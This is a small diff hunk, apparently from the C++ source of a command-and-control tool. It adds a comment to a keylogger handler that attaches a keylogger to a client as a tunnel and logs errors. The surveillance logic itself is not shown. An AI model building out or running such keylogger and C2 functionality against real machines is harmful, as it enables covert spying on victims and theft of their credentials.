@@ -379,7 +379,7 @@ void CommandHandler::keylogger() {
             *p_event_log_ << LOG_MUST << RED << "Failed to allocate memory for Keylogger" << RESET_C2_FIFO;
             return;
         }
-        rc = p_clients_->at(client_index)->set_tunnel(p_keylogger, KEYLOGGER);
+        rc = p_clients_->at(client_index)->set_tunnel(p_keylogger, KEYLOGGER); // Logical value to check the activity of the keylogger
         if (rc < 0) {
             *p_event_log_ << LOG_MUST << RED << "Keylogger is already active" << RESET_C2_FIFO;
             delete p_keylogger;
